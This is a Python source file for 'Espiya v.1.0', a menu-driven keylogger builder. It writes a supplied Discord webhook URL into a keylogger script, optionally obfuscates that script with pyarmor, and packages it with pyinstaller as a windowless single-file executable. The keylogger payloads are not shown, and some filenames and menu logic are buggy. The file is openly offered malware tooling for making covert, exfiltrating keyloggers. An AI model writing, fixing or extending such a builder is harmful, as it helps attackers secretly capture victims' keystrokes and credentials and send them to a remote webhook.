import os, time, platform, subprocess

def obfuscate1():
    #script_path = os.path.abspath("localkeylogger.py")
    script_path = "localkeylogger.py"
    try:
        subprocess.run(["pyarmor", "obfuscate", "--output", "obfuscated", script_path], check=True, shell=True)
        print("Script obfuscated successfully.")
    except subprocess.CalledProcessError as e:
        print("Error obfuscating script:", e)
        return
    try:
        subprocess.run(["pyinstaller", "--noconsole", "--onefile", "keylogger.py"], check=True, shell=True) 
        print("Executable created successfully (keylogger.exe).")
    except subprocess.CalledProcessError as e:
        print("Error creating executable:", e)

def normal():
    #script_path = os.path.abspath("localkeylogger.py")
    script_path = "localkeylogger.py"
    try:
        subprocess.run(["pyinstaller", "--noconsole", "--onefile", script_path], check=True, shell=True)
        print("Executable created successfully (keylogger.exe).")
    except subprocess.CalledProcessError as e:
        print("Error creating executable:", e)

def changewindowsizename():
    if platform.system() == 'Windows':
        os.system(f'title Espiya v.1.0 - Azrael')
        os.system(f'mode con: cols={70} lines={30}')

def clearscreen():
    if platform.system() == 'Linux':
        os.system('clear')    
    elif platform.system() == 'Windows':
        os.system('cls')

def local_keylogger(): 
    choice1 = input("Obfuscate [Y/N]?") 
    if choice1.upper() == "Y":
        obfuscate1()
    elif choice1.upper() == "N":
        normal()

def dcobfuscated():
    script_path = "discordkeylogger.py"
    try:
        subprocess.run(["pyarmor", "obfuscate", "--output", "obfuscated", script_path], check=True, shell=True)
        print("Script obfuscated successfully.")
    except subprocess.CalledProcessError as e:
        print("Error obfuscating script:", e)
        return
    try:
        subprocess.run(["pyinstaller", "--noconsole", "--onefile", "keylogger.py"], check=True, shell=True) 
        print("Executable created successfully (keylogger.exe).")
    except subprocess.CalledProcessError as e:
        print("Error creating executable:", e)

def dc():
    script_path = "discodkeyloggerr.py"
    try:
        subprocess.run(["pyinstaller", "--noconsole", "--onefile", script_path], check=True, shell=True)
        print("Executable created successfully (keylogger.exe).")
    except subprocess.CalledProcessError as e:
        print("Error creating executable:", e)

def discord():
    webhook_url = input("Input Discord webhook URL:")
    with open('discordkeylogger.py', 'r') as file:
        discordkeylogger_code = file.read()
    modified_code = discordkeylogger_code.replace("{webhook_url}", webhook_url)
    with open('discordkeylogger.py', 'w') as file:
        file.write(modified_code)
    with open('discordkeylogger.py', 'w') as file:
        file.write(modified_code)
    ask = input("Obfuscated [Y/N]?")
    if ask.upper() == "Y":
        dcobfuscated()
    elif ask.upper() == "N":
        dc()

def main():
    changewindowsizename()
    clearscreen()
    print("""  
            
        sSSs    sSSs   .S_sSSs     .S   .S S.    .S_SSSs    
        d%%SP   d%%SP  .SS~YS%%b   .SS  .SS SS.  .SS~SSSSS   
        d%S'    d%S'    S%S   `S%b  S%S  S%S S%S  S%S   SSSS  
        S%S     S%|     S%S    S%S  S%S  S%S S%S  S%S    S%S  
        S&S     S&S     S%S    d*S  S&S  S%S S%S  S%S SSSS%S  
        S&S_Ss  Y&Ss    S&S   .S*S  S&S   SS SS   S&S  SSS%S  
        S&S~SP  `S&&S   S&S_sdSSS   S&S    S S    S&S    S&S  
        S&S       `S*S  S&S~YSSY    S&S    SSS    S&S    S&S  
        S*b        l*S  S*S         S*S    S*S    S*S    S&S  
        S*S.      .S*P  S*S         S*S    S*S    S*S    S*S  
        SSSbs  sSS*S   S*S         S*S    S*S    S*S    S*S  
        YSSP  YSS'    S*S         S*S    S*S    SSS    S*S  
                    SP          SP     SP            SP   
                    Y           Y      Y             Y    
                
                            v.1.0
            
                        Written by:Azrael
                       (Simple Keylog Gen)
                        
                    [1] Local 
                    [2] Discord Web Hook 
                    [Q] Quit                                                                    
                                                                    """)
    menu = input("                            espiya?:")
    if menu == "1":
        local_keylogger()
    elif menu == "2":
        discord()
    elif menu == "Q" or "q":
        exit()
    else:
        print("Error!")

if __name__ == "__main__":
    main()

